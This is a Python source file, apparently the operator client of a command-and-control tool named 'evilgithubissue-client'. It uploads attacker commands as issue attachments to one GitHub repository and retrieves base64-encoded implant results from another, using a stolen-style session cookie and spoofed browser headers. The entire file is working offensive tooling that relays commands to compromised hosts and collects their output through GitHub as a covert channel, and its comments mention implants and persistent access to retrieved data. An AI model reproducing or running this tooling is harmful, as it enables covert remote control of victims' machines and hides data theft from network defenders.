import shutil
import signal
import sys
import base64
import http.client
import json
import sys
import re
import html
import configparser
from urllib.parse import urlparse
import color



c2_github_config = configparser.ConfigParser()
c2_github_config.read('server.ini')

# GLOBAL CONFIG
# COOKIE for example 
C2_GITHUB_REPO = c2_github_config['github']['c2_github_repo']
C2_RESULT_REPO = c2_github_config['github']['c2_result_repo']
C2_GITHUB_ACCOUNT_COOKIE = 'YOUR_GITHUB_COOKIE'
C2_CLIENT_USER_AGENT = c2_github_config['github']['c2_client_user_agent']
PROXY_HOST = c2_github_config['github']['proxy_host']
PROXY_PORT = int(c2_github_config['github']['proxy_port'])



def fetchRepoHtml(host, path):

    if PROXY_HOST != '':
        connection = http.client.HTTPSConnection(PROXY_HOST, PROXY_PORT)
        connection.set_tunnel(host)
    else:
        connection = http.client.HTTPSConnection(host)

    headers = {
        'Accept': 'text/html, application/xhtml+xml',
        'Cookie': C2_GITHUB_ACCOUNT_COOKIE,
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'User-Agent': C2_CLIENT_USER_AGENT,
        'Origin': 'https://github.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9,ar-LB;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5'
    }
    
    connection.request("GET", path, headers=headers)
    response = connection.getresponse()
    html_response = response.read().decode()
    connection.close()
    return html_response

def scrapeRepoID(html_response):
    repo_id = re.search(r'<button [^>]*data-hydro-click="([^"]+)"', html_response)
    if repo_id:
        return repo_id.group(1)
    return None


def getGithubRepoID(repo_url):
    host = 'github.com'
    path = "/" + repo_url.split('/')[-2] + "/" + repo_url.split('/')[-1]
    html_response = fetchRepoHtml(host, path)
    repo_json_data = scrapeRepoID(html_response)
    if repo_json_data:
        repo_json_data = json.loads(html.unescape(repo_json_data))
        repo_id = repo_json_data['payload']['repository_id']
        print(color.light_green("[+]") + " Repo ID Found: ", repo_id)
        return repo_id
    else:
        # Add error handling
        print(color.light_red("[-]") + " Can't Find The Repo ID")
        return None

def readTasksFile(task_filename):
    with open(task_filename, 'r') as task_file_handler:
        tasks = task_file_handler.readlines()
    return tasks

def writeTasksFile(task, task_filename):
    try:
        with open(task_filename, 'w') as task_file_handler:
            task_file_handler.write(task)
        return True
    except:
        return False


# Request 1
def getUploadPolicy(repository_id, size):
    # Proxy Settings for request debug
    if PROXY_HOST != '':
        connection = http.client.HTTPSConnection(PROXY_HOST, PROXY_PORT)
        connection.set_tunnel("github.com")
    else:
        connection = http.client.HTTPSConnection("github.com")

    
    boundary = "----WebKitFormBoundarylTYOL6aCn8vV8xYA"

    # Headers required for the request
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Accept': 'application/json',
        'Cookie': C2_GITHUB_ACCOUNT_COOKIE,
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'User-Agent': C2_CLIENT_USER_AGENT,
        'Origin': 'https://github.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9,ar-LB;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5'
    }

    # Construct the body using the specified boundary
    body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"name\"\r\n\r\n"
        f"task.zip\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"size\"\r\n\r\n"
        f"{size}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"content_type\"\r\n\r\n"
        f"application/x-zip-compressed\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"authenticity_token\"\r\n\r\n"
        f"peVFfi0B7_rUsgTYzz9LaNpAgsZAswAbeh5l74G5j5VSlZ5uaqzGuO1AqCNIZNoJ8crv-l5RSee0SNviokYrDw\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"repository_id\"\r\n\r\n"
        f"{repository_id}\r\n"
        f"--{boundary}--\r\n"
    )

    # Convert the body to bytes
    body_bytes = body.encode('utf-8')
    headers['Content-Length'] = str(len(body_bytes))

    # Send the request
    connection.request("POST", "/upload/policies/assets", body=body_bytes, headers=headers)
    response = connection.getresponse()
    
    return response.status, json.loads(response.read().decode())

def uploadFileContent(request_1_response, task):
    # Proxy Settings for request debug
    if PROXY_HOST != '':
        connection = http.client.HTTPSConnection(PROXY_HOST, PROXY_PORT)
        connection.set_tunnel("objects-origin.githubusercontent.com")
    else:
        connection = http.client.HTTPSConnection("objects-origin.githubusercontent.com")
    
    boundary = "----WebKitFormBoundaryOjUm0IpdzXmxubBE"

    # Headers required for the request
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Accept': 'application/json',
        'Cookie': C2_GITHUB_ACCOUNT_COOKIE,
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'User-Agent': C2_CLIENT_USER_AGENT,
        'Origin': 'https://github.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9,ar-LB;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5'
    }

    # Construct the body using the specified boundary
    body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"key\"\r\n\r\n"
        f"{request_1_response['form']['key']}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"acl\"\r\n\r\n"
        f"private\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"policy\"\r\n\r\n"
        f"{request_1_response['form']['policy']}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"X-Amz-Algorithm\"\r\n\r\n"
        f"{request_1_response['form']['X-Amz-Algorithm']}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"X-Amz-Credential\"\r\n\r\n"
        f"{request_1_response['form']['X-Amz-Credential']}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"X-Amz-Date\"\r\n\r\n"
        f"{request_1_response['form']['X-Amz-Date']}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"X-Amz-Signature\"\r\n\r\n"
        f"{request_1_response['form']['X-Amz-Signature']}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"Content-Type\"\r\n\r\n"
        f"{request_1_response['form']['Content-Type']}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"task.zip\"\r\n"
        f"Content-Type: {request_1_response['form']['Content-Type']}\r\n\r\n"
        f"{task}\r\n"
        f"--{boundary}--\r\n"
    )

    # Convert the body to bytes
    body_bytes = body.encode('utf-8')
    headers['Content-Length'] = str(len(body_bytes))

    # Send the request
    connection.request("POST", "/github-production-repository-file-5c1aeb", body=body_bytes, headers=headers)
    response = connection.getresponse()
    
    return response.status, response.read().decode()

def getUploadLink(request_1_response):
    # Proxy Settings for request debug
    if PROXY_HOST != '':
        connection = http.client.HTTPSConnection(PROXY_HOST, PROXY_PORT)
        connection.set_tunnel("github.com")
    else:
        connection = http.client.HTTPSConnection("github.com")
    
    boundary = "----WebKitFormBoundaryUBBr8hBHklsWkqdq"

    # Headers required for the request
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Accept': 'application/json',
        'Cookie': C2_GITHUB_ACCOUNT_COOKIE,
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'User-Agent': C2_CLIENT_USER_AGENT,
        'Origin': 'https://github.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9,ar-LB;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5'
    }

    # Construct the body using the specified boundary
    body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"authenticity_token\"\r\n\r\n"
        f"{request_1_response['asset_upload_authenticity_token']}\r\n"
        f"--{boundary}--\r\n"
    )

    # Convert the body to bytes
    body_bytes = body.encode('utf-8')
    headers['Content-Length'] = str(len(body_bytes))
    # Send the request
    connection.request("PUT", f"/upload/repository-files/{request_1_response['asset']['id']}", body=body_bytes, headers=headers)
    response = connection.getresponse()
    
    return response.status, json.loads(response.read().decode())

def scheduleTasks(task, task_retrieval_filename, repo_id):
    status, response = getUploadPolicy(repo_id, len(task))
    status_1, response_1 = uploadFileContent(response, task)
    status_2, response_2 = getUploadLink(response)
    print(color.light_green("[+]") + f" Task Link: {response_2['href']}")
    with open(task_retrieval_filename, 'a') as task_retrieval_filehandler:
        task_retrieval_filehandler.write( response['asset_upload_authenticity_token'] + ':' + response_2['href'] + '\n')
    return response_2['id']

# This function will be used to configure the first_command and first_result IDs
# It's a workaround until i find a way to get all issue attachements IDs
def setup(repo_id_tasks, repo_id_result):
    FIRST_TASK_ID = scheduleTasks('Starting CMD', 'scheduled.txt', repo_id_tasks)
    c2_github_config.set('github', 'first_command', str(FIRST_TASK_ID))
    FIRST_RESULT_ID = scheduleTasks('Starting Result', 'result.txt', repo_id_result)
    c2_github_config.set('github', 'first_results', str(FIRST_RESULT_ID))

    with open('server.ini', 'w') as serverConfigfile:
        c2_github_config.write(serverConfigfile)
    
    return FIRST_TASK_ID, FIRST_RESULT_ID

# NOT USED
def updateConfig(FIRST_TASK_ID, FIRST_RESULT_ID):
    c2_github_config.set('github', 'first_command', str(FIRST_TASK_ID))
    c2_github_config.set('github', 'first_results', str(FIRST_RESULT_ID))

    with open('server.ini', 'w') as serverConfigfile:
        c2_github_config.write(serverConfigfile)



def getTaskResult(repo_id_result, FIRST_RESULT_ID):
    print("[*] Expecting the last task result id")
    expected_task_id = scheduleTasks('starting', 'result.txt', repo_id_result)
    print(expected_task_id)

    while FIRST_RESULT_ID < expected_task_id:
        current_url = C2_RESULT_REPO + "/files/" + str(FIRST_RESULT_ID) + "/result.zip"
        parsed_url = urlparse(current_url)
        connection = http.client.HTTPSConnection(parsed_url.hostname)
        connection.request("GET", parsed_url.path)
        response = connection.getresponse()

        if response.status != 404:
            print(color.light_green("[+]") + f" Fetching Result For Task: {FIRST_RESULT_ID}")

            if response.status in (301, 302, 303, 307, 308):
                connection = http.client.HTTPSConnection(urlparse(response.headers['Location']).hostname)
                parsed_url = urlparse(response.headers['Location'])
                connection.request("GET", parsed_url.path + '?' + parsed_url.query)
                response = connection.getresponse()
                data = response.read().decode()
                connection.close()
                fetched_result = (base64.b64decode(data)).decode('utf-8')
                print(color.light_green("[+]"))
                print(fetched_result)
        FIRST_RESULT_ID += 1
    return FIRST_RESULT_ID

def cancel_handler(sig, frame):
    print(color.cyan("\n[~]") + " Shutdown Client")
    # shutil.copy('server.ini',  '<timestamp>' + 'server.ini') # Will be used to gain persistent access to the retrieved data
    sys.exit(0)



def main():
    signal.signal(signal.SIGINT, cancel_handler)
    repo_id_tasks = getGithubRepoID(C2_GITHUB_REPO)
    repo_id_result = getGithubRepoID(C2_RESULT_REPO)
    # SETUP: will update the server.in file
    # FIRST_TASK_ID: will be used by the implant
    # Implant: Start from FIRST_TASK_ID to retrieve commands
    FIRST_TASK_ID, FIRST_RESULT_ID = setup(repo_id_tasks, repo_id_result)

    while True:
        print('evilgithubissue-client> ', end='')
        command = input()
        if command == 'quit' or command == 'exit':
            print(color.cyan("[~]") + " Shutdown Client")
            # shutil.copy('server.ini',  '23' + 'server.ini')
            sys.exit(1)

        else:
            if command == 'execute':
                tasks = readTasksFile('task.zip')
                for task in tasks:
                    scheduleTasks(task, 'scheduled.txt', repo_id_tasks)
            elif command == 'fetch':
                getTaskResult(repo_id_result, FIRST_RESULT_ID)
            else:
                writeTasksFile(command, 'task.zip')
        #updateConfig(FIRST_TASK_ID, FIRST_RESULT_ID)
        print( color.light_green("[+]")+ f" Command Tasked: {command}")


if __name__ == '__main__':
    main()



